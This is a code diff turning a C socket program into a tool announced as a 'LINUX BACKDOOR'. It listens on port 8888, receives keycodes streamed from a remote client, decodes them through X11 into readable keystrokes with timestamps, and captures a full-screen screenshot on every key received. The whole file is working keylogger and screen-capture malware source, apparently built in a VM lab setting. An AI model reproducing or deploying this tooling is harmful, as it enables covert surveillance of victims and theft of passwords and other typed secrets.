@@ -1,82 +1,208 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <sys/socket.h>
-#include <netinet/in.h>
 #include <arpa/inet.h>
 #include <X11/Xlib.h>
+#include <X11/Xlib-xcb.h>
+#include <X11/extensions/Xfixes.h>
+#include <X11/extensions/Xdamage.h>
+#include <X11/extensions/XShm.h>
+#include <X11/extensions/XTest.h>
 #include <X11/Xutil.h>
+#include <X11/Xatom.h>
 
-#define SERVER_PORT 12345
+#define SERVER_PORT 8888
+#define BUFFER_SIZE 1024
+#define SCREENSHOT_FILE "screenshot.jpg"
+
+void printMessage(char *message, char *color, int omit_date)
+{
+    time_t current_time = time(NULL);
+    struct tm *local_time = localtime(&current_time);
+    char date_string[20];
+    strftime(date_string, sizeof(date_string), "%Y-%m-%d %H:%M:%S", local_time);
+
+    char default_color[] = "\033[0m";
+    // if there is no color, print the message without color
+    if (color == NULL)
+    {
+        if (omit_date == 1)
+        {
+            printf("%s\n", message);
+        }
+        else
+        {
+            printf("\033[0;30m[%s] %s%s\n", date_string, default_color, message);
+        }
+    }
+    else
+    {
+        if (omit_date == 1)
+            printf("%s%s%s\n", color, message, default_color);
+        else
+            printf("\033[0;30m[%s] %s%s%s\n", date_string, color, message, default_color);
+    }
+}
+
+void saveScreenshot(XImage *image)
+{
+    int x, y;
+    FILE *file;
+
+    file = fopen(SCREENSHOT_FILE, "wb");
+    if (!file)
+    {
+        printMessage("Failed to open screenshot file", "\033[0;31m", 1);
+        return;
+    }
+
+    fprintf(file, "P6\n%d %d 255\n", image->width, image->height);
+
+    for (y = 0; y < image->height; y++)
+    {
+        for (x = 0; x < image->width; x++)
+        {
+            unsigned long pixel = XGetPixel(image, x, y);
+            fputc(pixel >> 16, file); // Red component
+            fputc(pixel >> 8, file);  // Green component
+            fputc(pixel, file);       // Blue component
+        }
+    }
+
+    fclose(file);
+
+    char message[128];
+    sprintf(message, "Screenshot saved as %s", SCREENSHOT_FILE);
+    printMessage(message, "\033[0;32m", 1);
+}
 
 int main()
 {
-    // Criando o socket do servidor
-    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    if (sockfd == -1)
+    int sockfd;
+    struct sockaddr_in server_addr;
+    char buffer[BUFFER_SIZE];
+
+    printMessage("===== [LINUX BACKDOOR] =====", "\033[0;32m", 1);
+
+    // Create socket
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0)
     {
-        perror("Erro ao criar o socket");
-        exit(1);
+        printMessage("Failed to create socket", "\033[0;31m", 1);
+        exit(EXIT_FAILURE);
     }
 
-    struct sockaddr_in serverAddr, clientAddr;
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(SERVER_PORT);
-    serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);
+    // Set up server address
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+    server_addr.sin_port = htons(SERVER_PORT);
 
-    if (bind(sockfd, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == -1)
+    // Bind socket to the server address
+    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
     {
-        perror("Erro ao realizar o bind");
-        exit(1);
+        printMessage("Please, close the other instance of the program on the VM", "\033[0;31m", 1);
+        exit(EXIT_FAILURE);
     }
 
-    if (listen(sockfd, 1) == -1)
+    // Listen for incoming connections
+    if (listen(sockfd, 1) < 0)
     {
-        perror("Erro ao aguardar conexões");
-        exit(1);
+        printMessage("You may need to run this program as root", "\033[0;31m", 1);
+        exit(EXIT_FAILURE);
     }
 
-    socklen_t clientAddrLen = sizeof(clientAddr);
-    int clientSockfd = accept(sockfd, (struct sockaddr *)&clientAddr, &clientAddrLen);
-    if (clientSockfd == -1)
+    char listening_msg[128];
+    sprintf(listening_msg, "Listening on port %d", SERVER_PORT);
+    printMessage(listening_msg, "\033[0;33m", 1);
+
+    while (1)
     {
-        perror("Erro ao aceitar a conexão do cliente");
-        exit(1);
+        struct sockaddr_in client_addr;
+        socklen_t client_len = sizeof(client_addr);
+        int client_sockfd;
+        int size;
+
+        // Accept incoming connection
+        client_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &client_len);
+        if (client_sockfd < 0)
+        {
+            printMessage("Failed to accept connection", "\033[0;31m", 1);
+            exit(EXIT_FAILURE);
+        }
+
+        char received_connection_msg[128];
+        sprintf(received_connection_msg, "Received a connection from %s:%d", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
+        printMessage(received_connection_msg, "\033[0;33m", 1);
+
+        // Receive data
+        while ((size = recv(client_sockfd, buffer, BUFFER_SIZE, 0)) > 0)
+        {
+            // Process received data
+            KeyCode pc = (KeyCode)buffer[0] + 8;
+            Display *dpy = XOpenDisplay(NULL);
+
+            static char received_string[BUFFER_SIZE];
+            static int string_length = 0;
+
+            KeySym keysym = XKeycodeToKeysym(dpy, pc, 0);
+            char *converted = XKeysymToString(keysym);
+
+            // Valid character
+            if (converted != NULL)
+            {
+                if (buffer[0] == 57)
+                {
+                    strncpy(received_string + string_length, " ", BUFFER_SIZE - string_length - 1);
+                    string_length++;
+                    received_string[string_length] = '\0'; // Add null-terminating character
+                }
+                else if (strlen(converted) == 1)
+                {
+                    // Copy the converted character(s) to the received_string buffer
+                    strncpy(received_string + string_length, converted, BUFFER_SIZE - string_length - 1);
+                    string_length++;
+                    received_string[string_length] = '\0'; // Add null-terminating character
+                }
+                else
+                {
+                    if (strlen(received_string) > 0)
+                    {
+                        printMessage(received_string, NULL, 0);
+                        strcpy(received_string, "");
+                        string_length = 0;
+                    }
+
+                    // Transform converted string to *%s* format
+                    char converted_string[BUFFER_SIZE];
+                    sprintf(converted_string, "*%s*", converted);
+                    printMessage(converted_string, "\033[0;34m", 0);
+                }
+            }
+
+            // Capture and save screenshot
+            XWindowAttributes window_attrs;
+            XGetWindowAttributes(dpy, DefaultRootWindow(dpy), &window_attrs);
+
+            XImage *image = XGetImage(dpy, DefaultRootWindow(dpy), 0, 0, window_attrs.width, window_attrs.height, AllPlanes, ZPixmap);
+            saveScreenshot(image);
+            XDestroyImage(image);
+
+            XCloseDisplay(dpy);
+        }
+
+        if (size < 0)
+        {
+            perror("Failed to receive data");
+            exit(EXIT_FAILURE);
+        }
+
+        printMessage("Connection closed", "\033[0;33m", 1);
+        close(client_sockfd);
     }
 
-    // Recebendo a imagem do capturador
-    int screen_width, screen_height;
-    if (recv(clientSockfd, &screen_width, sizeof(screen_width), 0) == -1 ||
-        recv(clientSockfd, &screen_height, sizeof(screen_height), 0) == -1)
-    {
-        perror("Erro ao receber a largura e a altura da imagem");
-        exit(1);
-    }
-
-    int image_size = screen_width * screen_height * 4;
-    unsigned char *data = (unsigned char *)malloc(image_size);
-    if (recv(clientSockfd, data, image_size, 0) == -1)
-    {
-        perror("Erro ao receber a imagem");
-        exit(1);
-    }
-
-    // Exibindo a imagem recebida
-    Display *display = XOpenDisplay(NULL);
-    Window root = DefaultRootWindow(display);
-
-    XImage *image = XCreateImage(display, DefaultVisual(display, 0), DefaultDepth(display, 0),
-                                 ZPixmap, 0, (char *)data, screen_width, screen_height, 32, 0);
-
-    XPutImage(display, root, DefaultGC(display, 0), image, 0, 0, 0, 0, screen_width, screen_height);
-    XFlush(display);
-
-    // Aguardando um tempo para visualizar a imagem
-    sleep(5);
-
-    // Liberando recursos
-    XDestroyImage(image);
-    XCloseDisplay(display);
-    close(clientSockfd);
+    // Close the socket
     close(sockfd);
 
     return 0;
